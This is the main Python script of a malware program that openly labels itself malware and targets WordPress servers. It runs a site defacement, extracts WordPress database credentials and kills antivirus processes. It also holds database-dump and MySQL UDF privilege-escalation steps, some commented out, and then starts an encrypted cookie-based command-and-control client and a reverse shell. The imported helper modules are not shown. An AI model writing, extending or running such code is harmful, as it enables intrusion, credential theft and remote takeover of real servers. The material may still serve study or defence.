#!/usr/bin/python3
import logging, sys, os
from modules.cookie_comm import communication_client_main, read_file
from modules.crypto import encrypt, decrypt
from queue import Queue
from socket import gethostbyname, gethostname


from concurrent.futures import ThreadPoolExecutor

from modules.malware.defacement import defacement

from modules.malware.mysql import dump_wp_db, priv_esc_udf
from modules.malware.check_process import check_parent, kill_avs, self_kill
from modules.malware.wordpress import get_wp_db_creds

from modules.malware.execute import reverse_shell_main, is_root
from time import sleep
from modules.hash import hash

if __name__ == '__main__':
    exfiltrate = Queue()
    instructions = Queue()
    client_id = f"{gethostname()}-{gethostbyname(gethostname())}"

    #  [%(thread)-6d] [%(threadName)-25s]
    FORMAT = '[%(asctime)s] [%(funcName)-30s] [%(levelname)-8s] [%(message)s]'
    #logging.basicConfig(filename='/tmp/malware.log', encoding='utf-8', format=FORMAT, level=0)
    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=30)

    logging.info("START MALWARE MAIN")
    print("START MALWARE MAIN")

    status = check_parent()
    if not status:
        exfiltrate.put('Parent')
        print("Parent")
        defacement(exfiltrate)
        db_creds = get_wp_db_creds(exfiltrate)
        if db_creds:
            #dump_wp_db(db_creds, exfiltrate)
            pass
        if is_root():
            print("Is Root")
            kill_avs()
        else:
            print("Is not Root")
            #if not status:
            if db_creds:
                print("Do Priv Esc")
                #priv_esc_udf(db_creds, exfiltrate)
                print("Finish")
                self_kill()
                print("HALLLO")
            else:
                print("No Creds")
           
    else:
        print("Child")
        #print(os.system('id'))
        
    sleep(10)
    exfiltrate.put('END') # flag to open shell

    with ThreadPoolExecutor(max_workers=2) as executor:
        
        executor.submit(communication_client_main, client_id, exfiltrate, instructions, encrypt, decrypt)

        executor.submit(reverse_shell_main, instructions, exfiltrate, 5)
        
            


    # Persistenz
     